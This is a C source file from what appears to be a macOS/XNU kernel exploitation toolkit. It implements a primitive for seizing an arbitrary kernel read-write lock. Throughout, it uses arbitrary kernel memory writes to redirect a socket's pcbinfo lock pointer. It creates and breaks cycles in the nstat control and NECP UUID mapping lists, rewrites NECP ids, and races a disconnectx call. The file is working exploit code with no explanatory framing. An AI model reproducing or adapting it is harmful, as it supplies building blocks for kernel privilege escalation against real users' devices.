//
//  util_lck_rw.c
//  xe
//
//  Created by admin on 12/2/21.
//

#include <assert.h>
#include <stdlib.h>
#include <string.h>
#include <stdatomic.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include <dispatch/dispatch.h>

#include "util_lck_rw.h"
#include "kmem.h"
#include "slider.h"
#include "xnu_proc.h"
#include "platform_types.h"
#include "platform_variables.h"
#include "util_dispatch.h"


struct xe_util_lck_rw {
    int sock_fd;
    uintptr_t lck;
    uintptr_t socket;
    uintptr_t so_pcb;
    uintptr_t inp_pcbinfo;
    uintptr_t nstat_controls_head;
    uintptr_t nstat_controls_tail;
    uintptr_t necp_uuid_id_mapping_head;
    uintptr_t necp_uuid_id_mapping_tail;
    
    dispatch_semaphore_t sem_disconnect_done;
};


void xe_util_lck_rw_set_lock(xe_util_lck_rw_t util) {
    assert(util->inp_pcbinfo != 0);
    assert(util->so_pcb != 0);
    uintptr_t new_inp_pcbinfo = util->lck - TYPE_INPCBINFO_MEM_IPI_LOCK_OFFSET;
    assert(xe_kmem_read_uint64(KMEM_OFFSET(util->so_pcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET)) == util->inp_pcbinfo);
    xe_kmem_write_uint64(KMEM_OFFSET(util->so_pcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET), new_inp_pcbinfo);
}

void xe_util_lck_rw_restore_lock(xe_util_lck_rw_t util) {
    assert(util->inp_pcbinfo != 0);
    assert(util->so_pcb != 0);
    xe_kmem_write_uint64(KMEM_OFFSET(util->so_pcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET), util->inp_pcbinfo);
}

void xe_util_lck_create_nstat_controls_cycle(xe_util_lck_rw_t util) {
    assert(util->nstat_controls_head != 0);
    assert(util->nstat_controls_tail != 0);
    assert(xe_kmem_read_uint64(KMEM_OFFSET(util->nstat_controls_tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET)) == 0);
    xe_kmem_write_uint64(KMEM_OFFSET(util->nstat_controls_tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET), util->nstat_controls_head);
}

void xe_util_lck_break_nstat_controls_cycle(xe_util_lck_rw_t util) {
    assert(util->nstat_controls_head != 0);
    assert(util->nstat_controls_tail != 0);
    assert(xe_kmem_read_uint64(KMEM_OFFSET(util->nstat_controls_tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET)) == util->nstat_controls_head);
    xe_kmem_write_uint64(KMEM_OFFSET(util->nstat_controls_tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET), 0);
}

void xe_util_lck_read_nstat_controls_state(xe_util_lck_rw_t util) {
    assert(util->nstat_controls_head == 0);
    assert(util->nstat_controls_tail == 0);
    uintptr_t head = xe_kmem_read_uint64(xe_slider_slide(VAR_NSTAT_CONTROLS_ADDR));
    uintptr_t tail = head;
    while (TRUE) {
        uintptr_t next = xe_kmem_read_uint64(KMEM_OFFSET(tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET));
        if (next == 0) {
            break;
        } else {
            tail = next;
        }
    }
    assert(head != tail);
    util->nstat_controls_head = head;
    util->nstat_controls_tail = tail;
}

void xe_util_lck_create_necp_mapping_cycle(xe_util_lck_rw_t util) {
    assert(util->necp_uuid_id_mapping_head != 0);
    assert(util->necp_uuid_id_mapping_tail != 0);
    assert(xe_kmem_read_uint64(KMEM_OFFSET(util->necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET)) == 0);
    xe_kmem_write_uint64(KMEM_OFFSET(util->necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET), util->necp_uuid_id_mapping_head);
}

void xe_util_lck_break_necp_mapping_cycle(xe_util_lck_rw_t util) {
    assert(util->necp_uuid_id_mapping_head != 0);
    assert(util->necp_uuid_id_mapping_tail != 0);
    assert(xe_kmem_read_uint64(KMEM_OFFSET(util->necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET)) == util->necp_uuid_id_mapping_head);
    xe_kmem_write_uint64(KMEM_OFFSET(util->necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET), 0);
}

void xe_util_lck_invalidate_necp_ids(xe_util_lck_rw_t util) {
    assert(util->necp_uuid_id_mapping_head != 0);
    assert(util->necp_uuid_id_mapping_tail != 0);
    uintptr_t cursor = util->necp_uuid_id_mapping_head;
    do {
        uint32_t id = xe_kmem_read_uint32(KMEM_OFFSET(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_ID_OFFSET));
        assert(id <= 16);
        xe_kmem_write_uint64(KMEM_OFFSET(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_ID_OFFSET), UINT16_MAX - id);
        cursor = xe_kmem_read_uint64(KMEM_OFFSET(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET));
        assert(cursor != 0);
    } while (cursor != util->necp_uuid_id_mapping_tail);
}

void xe_util_lck_restore_necp_ids(xe_util_lck_rw_t util) {
    assert(util->necp_uuid_id_mapping_head != 0);
    assert(util->necp_uuid_id_mapping_tail != 0);
    uintptr_t cursor = util->necp_uuid_id_mapping_head;
    do {
        uint32_t id = xe_kmem_read_uint32(KMEM_OFFSET(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_ID_OFFSET));
        assert(id >= UINT16_MAX - 16);
        xe_kmem_write_uint64(KMEM_OFFSET(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_ID_OFFSET), UINT16_MAX - id);
        cursor = xe_kmem_read_uint64(KMEM_OFFSET(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET));
        assert(cursor != 0);
    } while (cursor != util->necp_uuid_id_mapping_tail);
}

void xe_util_lck_read_necp_uuid_id_mapping_state(xe_util_lck_rw_t util) {
    assert(util->necp_uuid_id_mapping_head == 0);
    assert(util->necp_uuid_id_mapping_tail == 0);
    uintptr_t head = xe_kmem_read_uint64(xe_slider_slide(VAR_NECP_UUID_ID_MAPPING_HEAD_ADDR));
    uintptr_t tail = head;
    while (TRUE) {
        uintptr_t next = xe_kmem_read_uint64(KMEM_OFFSET(tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET));
        if (next == 0) {
            break;
        } else {
            tail = next;
        }
    }
    assert(tail != head);
    util->necp_uuid_id_mapping_head = head;
    util->necp_uuid_id_mapping_tail = tail;
}

xe_util_lck_rw_t xe_util_lck_rw_lock_exclusive(uintptr_t proc, uintptr_t lock) {
    struct sockaddr_in6 src_addr;
    bzero(&src_addr, sizeof(src_addr));
    src_addr.sin6_addr = in6addr_loopback;
    src_addr.sin6_port = 18231;
    src_addr.sin6_family = AF_INET6;
    src_addr.sin6_len = sizeof(src_addr);
    
    int sock_fd = socket(PF_INET6, SOCK_DGRAM, 0);
    assert(sock_fd >= 0);
    
    sa_endpoints_t epts;
    bzero(&epts, sizeof(epts));
    epts.sae_dstaddr = (struct sockaddr*)&src_addr;
    epts.sae_dstaddrlen = sizeof(src_addr);

    int res = connectx(sock_fd, &epts, SAE_ASSOCID_ANY, 0, NULL, 0, NULL, NULL);
    assert(res == 0);
    
    uintptr_t socket;
    int error = xe_xnu_proc_find_fd_data(proc, sock_fd, &socket);
    assert(error == 0);
    
    uintptr_t inpcb = xe_kmem_read_uint64(KMEM_OFFSET(socket, TYPE_SOCKET_MEM_SO_PCB_OFFSET));
    uintptr_t inp_pcbinfo = xe_kmem_read_uint64(KMEM_OFFSET(inpcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET));
    
    xe_util_lck_rw_t util = (xe_util_lck_rw_t)malloc(sizeof(struct xe_util_lck_rw));
    bzero(util, sizeof(*util));
    util->sock_fd = sock_fd;
    util->socket = socket;
    util->so_pcb = inpcb;
    util->inp_pcbinfo = inp_pcbinfo;
    util->lck = lock;
    util->sem_disconnect_done = dispatch_semaphore_create(0);
    
    xe_util_lck_read_nstat_controls_state(util);
    xe_util_lck_read_necp_uuid_id_mapping_state(util);
    
    xe_util_lck_rw_set_lock(util);
    xe_util_lck_create_nstat_controls_cycle(util);
    
    dispatch_semaphore_t sem_disconnect_start = dispatch_semaphore_create(0);
    dispatch_async(xe_dispatch_queue(), ^() {
        dispatch_semaphore_signal(sem_disconnect_start);
        int error = disconnectx(util->sock_fd, SAE_ASSOCID_ANY, SAE_CONNID_ANY);
        assert(error == 0);
        dispatch_semaphore_signal(util->sem_disconnect_done);
    });
    
    dispatch_semaphore_wait(sem_disconnect_start, DISPATCH_TIME_FOREVER);
    dispatch_release(sem_disconnect_start);
    sleep(1);
    
    return util;
}


void xe_util_lck_rw_lock_done(xe_util_lck_rw_t* util) {
    xe_util_lck_rw_restore_lock(*util);
    
    // assign different laddr (other than loopback)
    struct in6_addr new_laddr;
    memset(&new_laddr, 0xab, sizeof(new_laddr));
    xe_kmem_write(KMEM_OFFSET((*util)->so_pcb, TYPE_INPCB_MEM_INP_DEPENDLADDR_OFFSET), &new_laddr, sizeof(new_laddr));
    
    xe_util_lck_invalidate_necp_ids(*util);
    xe_util_lck_create_necp_mapping_cycle(*util);
    xe_util_lck_break_nstat_controls_cycle(*util);
    sleep(1);
    xe_util_lck_rw_set_lock(*util);
    xe_util_lck_restore_necp_ids(*util);
    xe_util_lck_break_necp_mapping_cycle(*util);
    dispatch_semaphore_wait((*util)->sem_disconnect_done, DISPATCH_TIME_FOREVER);
    xe_util_lck_rw_restore_lock(*util);
    
    dispatch_release((*util)->sem_disconnect_done);
    free(*util);
    *util = NULL;
}
